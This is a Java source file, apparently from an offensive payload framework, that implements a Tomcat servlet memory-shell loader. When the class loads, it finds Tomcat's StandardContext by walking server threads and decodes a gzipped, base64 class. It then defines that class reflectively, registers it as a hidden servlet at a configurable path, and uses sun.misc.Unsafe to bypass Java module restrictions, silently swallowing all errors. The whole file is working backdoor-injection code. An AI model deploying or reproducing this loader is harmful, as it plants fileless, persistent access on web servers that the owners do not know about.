package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;
import sun.misc.Unsafe;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.List;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 * 8.0.53
 */
@Middleware(Middleware.Tomcat)
@MemShell(MemShell.Servlet)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME})
public class TomcatServletThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME;
    private static String PATH;
    private static String NAME;
    static {
        new TomcatServletThreadLoader();
    }
    public TomcatServletThreadLoader() {
        try {
            // 获取 standardContext
            Object standardContext = getStandardContext();

            inject(standardContext);

        } catch (Throwable e) {

        }
    }

//    public static void inject(Object standardContext) throws Exception {
//    }

    /**
     * Tomcat Servlet
     */
    public static void inject(Object standardContext) throws Exception {
        addModule();
        HashMap children = (HashMap) getFieldValue(standardContext, "children");
        if (children.containsKey(NAME)) {
            return;
        }

        // 动态代理兼容 javax jakarta
        Class servletClass = null;
        try {
            servletClass = Class.forName("jakarta.servlet.Servlet");
        } catch (Exception e) {
            try {
                servletClass = Class.forName("javax.servlet.Servlet");
            } catch (ClassNotFoundException ex) {

            }
        }

        byte[] bytes = decompress(gzipObject);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz;
        try {
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e) {
            clazz = classLoader.loadClass(CLASSNAME);
        }
        Object javaObject = clazz.newInstance();
        Object object = Proxy.newProxyInstance(servletClass.getClassLoader(), new Class[]{servletClass}, (InvocationHandler) javaObject);


        Object standardWrapper = Class.forName("org.apache.catalina.core.StandardWrapper").newInstance();
        invokeMethod(standardWrapper.getClass().getSuperclass(), standardWrapper, "setName", new Class[]{String.class}, new Object[]{NAME});
        invokeMethod(standardWrapper.getClass(), standardWrapper, "setServletClass", new Class[]{String.class}, new Object[]{CLASSNAME});
        try {
            invokeMethod(standardWrapper.getClass(), standardWrapper, "setServlet", new Class[]{servletClass}, new Object[]{object});
        } catch (Exception e) {
            setFieldValue(standardWrapper, "instance", object);
        }

        // addChild
        invokeMethod(Class.forName("org.apache.catalina.core.ContainerBase"), standardContext, "addChildInternal", new Class[]{Class.forName("org.apache.catalina.Container")}, new Object[]{standardWrapper});

//        // 取一种 缩短 payload
        try {
            // 7
            invokeMethod(Class.forName("org.apache.catalina.core.StandardContext"), standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATH, NAME});
        } catch (Exception e) {
            // 8-11
            invokeMethod(Class.forName("org.apache.catalina.core.StandardContext"), standardContext, "addServletMappingDecoded", new Class[]{String.class, String.class, boolean.class}, new Object[]{PATH, NAME, false});
        }
//        try {
//            // M1 Servlet映射到URL模式
//            invokeMethod(standardContext.getClass(), standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATH, NAME});
//        } catch (NoSuchMethodException e) {
//            // M2 Servlet3 新特性 Dynamic
//            Class<?> cls = Class.forName("org.apache.catalina.core.ApplicationServletRegistration");
//            Object applicationServletRegistration = cls.getConstructor(Class.forName("org.apache.catalina.Wrapper"), Class.forName("org.apache.catalina.Context")).newInstance(standardWrapper, standardContext);
//            invokeMethod(Class.forName("javax.servlet.ServletRegistration"), applicationServletRegistration, "addMapping", new Class[]{String[].class}, new Object[]{new String[]{PATH}});
//        }
    }

    public static Object getStandardContext() throws Exception {
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
//        Thread[] threads = new Thread[Thread.currentThread().getThreadGroup().activeCount()];
        for (int i = 0; i < threads.length; i++) {
            Thread thread = threads[i];
            // Thread 筛选
            if (thread == null)
                continue;
            String threadName = thread.getName();
            if (!(
                    ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                            || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                            || (threadName.contains("http-") && threadName.contains("Acceptor"))
            ))
                continue;
            Object target = getFieldValue(thread, "target");
            Object this0 = getFieldValue(target, "this$0");
            Object handler = getFieldValue(this0, "handler");
            Object global = getFieldValue(handler, "global");
            List processors = (List) getFieldValue(global, "processors");

            for (int j = 0; j < processors.size(); j++) {
                Object processor = processors.get(j);
                Object req = getFieldValue(processor, "req");
                Object request = req.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(req, new Integer(1));

                Object standardContext;
                try {
                    Object servletContext = request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                    Object applicationContext = getFieldValue(servletContext, "context");
                    standardContext = getFieldValue(applicationContext, "context");
                } catch (NoSuchMethodException e) {
                    standardContext = getFieldValue(request, "context");
                }

                return standardContext;
            }
        }


        return null;
    }

    // tools
    public static byte[] decompress(String gzipObject) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(base64(gzipObject));
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static byte[] base64(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


    public static void addModule() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            Method method = Class.class.getDeclaredMethod("getModule");
            method.setAccessible(true);
            Object module = method.invoke(Object.class);
            Class cls = TomcatServletThreadLoader.class;
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.setAccessible(true);
            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
        } catch (Exception e) {

        }
    }
}
